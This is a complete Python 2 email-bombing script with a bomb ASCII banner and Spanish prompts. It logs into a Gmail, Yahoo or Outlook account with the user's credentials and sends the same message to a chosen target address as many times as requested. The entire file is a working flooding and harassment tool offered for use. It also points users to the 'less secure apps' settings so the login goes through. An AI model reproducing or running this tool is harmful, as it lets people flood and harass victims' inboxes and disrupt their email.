#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb():
	os.system('clear')
	print bcolors.OKGREEN + '''
			 \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: SUMAN MANNA
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''' + bcolors.ENDC


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	print bcolors.OKGREEN + file1.read() + bcolors.ENDC
	file1.close()
except IOError:
	print('Banner File not found')

#Input
print(bcolors.WARNING + '''
Choose a Mail Service:
1) Gmail
2) Yahoo
3) Hotmail/Outlook
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
	server = raw_input(bcolors.OKGREEN + '[+] Mail Server: ' + bcolors.ENDC)
	user = raw_input(bcolors.OKGREEN + '[+] Tu Email: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + '[+] Contrasseña: ' + bcolors.ENDC)
	to = raw_input(bcolors.OKGREEN + '[+] Para: ' + bcolors.ENDC)
	subject = raw_input(bcolors.OKGREEN + '[+] Sujeto (Si quieres): ' + bcolors.ENDC)
	body = raw_input(bcolors.OKGREEN + '[+] Mensaje: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + '[+] Numero de emails deseados: ' + bcolors.ENDC)
	no = 0
	message = 'De: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + ''' [+] Nombre de usuario incorrecto , comprueba que tu cuenta acepta dispositivos desconocidos
		Hecha un vistazo: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + '[+] Exelente enviados ' + str(no+1) + ' emails [+]' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Failed to Send "
	server.close()
	
#Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''[+] Nombre de usuario incorrecto , comprueba que tu cuenta acepta dispositivos desconocidos
		Hecha un vistazo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + '[+] Exelente enviados ' + str(no + 1) + ' emails [+]' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Failed to Send"
	server.close()
	
#Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	bomb()
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '[+] Nombre de usuario o contrasseña incorrecta' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + '[+] Exelente enviados ' + str(no + 1) + ' emails [+]' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\n ERROR: Informacion no correcta.'
			sys.exit()
		except:
			print "Failed to Send "
	server.close()
	
else:
	print 'Solo disponible en Outlook , Gmail y Yahoo'
	sys.exit()
